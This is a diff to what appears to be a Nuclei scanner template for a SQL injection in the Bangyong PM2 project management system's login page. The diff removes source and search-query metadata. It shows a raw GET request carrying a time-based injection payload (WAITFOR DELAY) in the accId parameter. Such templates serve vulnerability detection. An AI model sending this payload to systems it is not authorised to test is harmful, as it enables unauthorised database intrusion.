@@ -3,14 +3,8 @@ info:
   name: 邦永PM2项目管理系统Global_UserLogin.aspxSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/7095d5e72bdfbebb72dd83f3db1b3742
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 7095d5e72bdfbebb72dd83f3db1b3742
-    fofa: + hunter`web.body="PM2项目管理系统BS版增强工具.zip"`
 http:
 - raw:
   - 'GET /Global/Global_UserLogin.aspx?accId=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
